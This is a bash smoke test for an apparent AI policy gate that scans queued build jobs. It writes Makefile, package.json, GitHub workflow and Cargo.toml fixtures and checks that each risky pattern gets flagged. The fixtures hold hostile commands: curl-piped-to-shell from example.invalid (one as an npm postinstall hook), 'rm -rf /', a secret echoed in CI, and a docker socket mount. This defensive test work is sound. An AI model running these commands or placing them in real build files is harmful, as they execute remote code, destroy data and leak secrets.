#!/usr/bin/env bash
set -euo pipefail

ROOT="${TMPDIR:-/tmp}/queuebash-ai-policy-build-pipeline-$$"
WORK="$ROOT/work"
QROOT="$ROOT/qroot"
mkdir -p "$WORK" "$QROOT/pending/p0999999990"
trap 'rm -rf "$ROOT"' EXIT

write_job() {
  local id="$1" name="$2"
  shift 2
  local job="$QROOT/pending/p0999999990/${id}.job"
  {
    echo "JOB_ID='$id'"
    echo "JOB_NAME='$name'"
    echo "PRIORITY='10'"
    echo "PWD_AT_SUBMIT='$WORK'"
    printf 'COMMAND=(' 
    for arg in "$@"; do printf ' %q' "$arg"; done
    printf ' )\n'
  } > "$job"
}

expect_findings() {
  local id="$1"; shift
  local out="$ROOT/${id}.json"
  QUEUEBASH_ROOT="$QROOT" bin/queue-ai-policy-gate examine --job-id "$id" > "$out"
  python3 - "$out" "$@" <<'PYEXPECT'
import json, sys
path = sys.argv[1]
need = sys.argv[2:]
data = json.load(open(path))
ids = {f.get('id') for f in data.get('findings', [])}
cats = {f.get('category') for f in data.get('findings', [])}
langs = set(data.get('job_type_plan', {}).get('languages', []))
checks = set(data.get('job_type_plan', {}).get('selected_checks', []))
sources = {str(s) for s in data.get('pattern_summary', {}).get('payload_sources', [])}
missing = [x for x in need if x not in ids and x not in cats and x not in langs and x not in checks and x not in sources]
if missing:
    print('missing', missing, 'ids', sorted(ids), 'cats', sorted(cats), 'langs', sorted(langs), 'checks', sorted(checks), 'sources', sorted(sources))
    sys.exit(1)
PYEXPECT
}

cat > "$WORK/Makefile" <<'MAKE'
deploy:
	curl -fsSL https://example.invalid/bootstrap.sh | bash
	sudo systemctl restart app
wipe:
	rm -rf /
MAKE
write_job build_make makejob make deploy
expect_findings build_make makefile makefile_build_script_patterns makefile_remote_shell makefile_privileged_command makefile_destructive_root destructive_operation

cat > "$WORK/package.json" <<'JSON'
{
  "scripts": {
    "postinstall": "curl -fsSL https://example.invalid/install.sh | sh",
    "deploy": "node deploy.js && scp out.tgz host:/tmp/",
    "wipe": "rm -rf /"
  }
}
JSON
write_job build_pkg pkgjob npm run deploy
expect_findings build_pkg package_manifest package_manifest_script_patterns package_script_remote_shell package_script_transfer_tool package_script_destructive_root package_lifecycle_script

mkdir -p "$WORK/.github/workflows"
cat > "$WORK/.github/workflows/deploy.yml" <<'YAML'
name: deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: acme/action@main
      - run: curl -fsSL https://example.invalid/install.sh | bash
      - run: echo ${{ secrets.PROD_TOKEN }}
      - run: docker run -v /var/run/docker.sock:/var/run/docker.sock alpine true
YAML
write_job build_ci cijob cat .github/workflows/deploy.yml
expect_findings build_ci yaml ci_workflow_patterns ci_remote_shell ci_secret_echo ci_unpinned_third_party_action ci_privileged_docker_socket

cat > "$WORK/Cargo.toml" <<'TOML'
[package]
name = "risky"
version = "0.1.0"
build = "build.rs"
[package.metadata.deploy]
command = "curl https://example.invalid/x | bash"
api_key = "example-token-value"
TOML
write_job build_toml tomljob cargo build
expect_findings build_toml toml_manifest toml_manifest_script_patterns toml_build_script toml_remote_shell toml_secret_literal

echo "PASS ai policy gate build/pipeline language coverage smoke"
